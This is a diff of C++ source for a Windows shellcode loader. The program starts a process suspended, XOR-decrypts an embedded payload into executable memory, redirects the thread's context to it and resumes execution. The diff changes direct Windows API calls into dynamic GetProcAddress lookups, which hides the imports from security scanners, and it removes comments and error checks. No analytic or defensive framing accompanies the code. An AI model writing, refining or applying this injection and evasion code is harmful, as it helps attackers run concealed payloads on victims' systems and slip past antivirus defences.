@@ -33,22 +33,22 @@ int main() {
     
     si.cb = sizeof(si);
     
+    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
+    
     // Create a new process in a suspended state
-    if (!CreateProcessA(processPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
-        std::cerr << "CreateProcess failed with error code " << GetLastError() << std::endl;
-        return -1;
-    }
+    auto pCreateProcessA = (BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))GetProcAddress(hKernel32, "CreateProcessA");
+    pCreateProcessA(processPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 
     // Get the thread context
     CONTEXT ctx = {0};
     ctx.ContextFlags = CONTEXT_FULL;
-    if (!GetThreadContext(pi.hThread, &ctx)) {
-        std::cerr << "GetThreadContext failed with error code " << GetLastError() << std::endl;
-        return -1;
-    }
+    
+    auto pGetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT))GetProcAddress(hKernel32, "GetThreadContext");
+    pGetThreadContext(pi.hThread, &ctx);
 
     // Create a file mapping (shared memory)
-    HANDLE hMapFile = CreateFileMappingA(
+    auto pCreateFileMappingA = (HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR))GetProcAddress(hKernel32, "CreateFileMappingA");
+    HANDLE hMapFile = pCreateFileMappingA(
         INVALID_HANDLE_VALUE,  // Use system paging file
         NULL,                  // Default security
         PAGE_EXECUTE_READWRITE, // Read/Write access
@@ -57,13 +57,9 @@ int main() {
         NULL                   // Name of the mapping object
     );
 
-    if (hMapFile == NULL) {
-        std::cerr << "CreateFileMapping failed with error code " << GetLastError() << std::endl;
-        return -1;
-    }
-
     // Map the view of the file into the process's memory space
-    LPVOID lpBase = MapViewOfFile(
+    auto pMapViewOfFile = (LPVOID(WINAPI*)(HANDLE, DWORD, DWORD, DWORD, SIZE_T))GetProcAddress(hKernel32, "MapViewOfFile");
+    LPVOID lpBase = pMapViewOfFile(
         hMapFile,              // Handle to the mapping object
         FILE_MAP_ALL_ACCESS,   // Read/Write access
         0,                     // High-order DWORD of the file offset
@@ -71,32 +67,24 @@ int main() {
         code199kLen            // Number of bytes to map
     );
 
-    if (lpBase == NULL) {
-        std::cerr << "MapViewOfFile failed with error code " << GetLastError() << std::endl;
-        CloseHandle(hMapFile);
-        return -1;
-    }
 
-    // XOR decrypt the code
+    
     for (DWORD i = 0; i < code199kLen; i++) {
         code199k[i] ^= ke[i % keLen];
     }
 
-    // Copy the decrypted payload into the mapped memory
+    
     memcpy(lpBase, code199k, code199kLen);
 
-    // Set the thread context to point to the mapped memory (entry point for execution)
-    ctx.Rcx = (DWORD64)lpBase; // Set the appropriate register (for 64-bit systems, Rcx is used for the first argument)
+   
+    ctx.Rcx = (DWORD64)lpBase;
     
-    if (!SetThreadContext(pi.hThread, &ctx)) {
-        std::cerr << "SetThreadContext failed with error code " << GetLastError() << std::endl;
-        UnmapViewOfFile(lpBase);
-        CloseHandle(hMapFile);
-        return -1;
-    }
-
+    auto pSetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT))GetProcAddress(hKernel32, "SetThreadContext");
+    pSetThreadContext(pi.hThread, &ctx);
+        
     // Resume the thread to execute the code
-    ResumeThread(pi.hThread);
+    auto pResumeThread = (DWORD(WINAPI*)(HANDLE))GetProcAddress(hKernel32, "ResumeThread");
+    pResumeThread(pi.hThread);
 
     // Cleanup
     UnmapViewOfFile(lpBase);
